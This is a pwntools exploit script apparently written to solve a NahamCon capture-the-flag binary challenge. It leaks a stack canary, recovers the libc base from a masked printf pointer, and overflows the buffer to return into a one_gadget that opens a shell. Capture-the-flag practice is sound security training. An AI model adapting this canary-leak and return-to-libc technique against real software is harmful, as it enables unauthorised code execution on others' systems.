from pwn import *

CONN = "nc challenge.nahamcon.com 32546".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
continue
""".format(
    **locals()
)

# Binary filename
exe = "./nahmnahmnahm"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
ld = ELF("/lib64/ld-linux-x86-64.so.2")

if args.REMOTE:
    libc = ELF("./libc-2.27.so")

# Start program
io = start()
offset = 0
# Build the payload

# Send the payload
io.sendafter(b"?", b"A" * 39 + b"~")
io.recvuntil(b"~")
canary = u64(io.recv(8).ljust(8, b"\x00"))
printf = canary ^ 0x123456789ABCDEF1
libc.address = printf - libc.sym["printf"]

info("canary: " + hex(canary))
info("printf: " + hex(printf))
info("libc: " + hex(libc.address))

# Clean buffer
binsh = libc.search(b"/bin/sh\x00").__next__()
poprdi = libc.search(asm("pop rdi; ret;")).__next__()
one_gadget = libc.address + 0x10a2fc

offset = 40
payload = flat({
  offset: [
    p64(canary),
    cyclic(8),
    p64(one_gadget),
  ] 
})

io.sendafter(b"again.", payload)
# info("Canary: " + hex(LEAKED))

# # Got Shell?
io.interactive()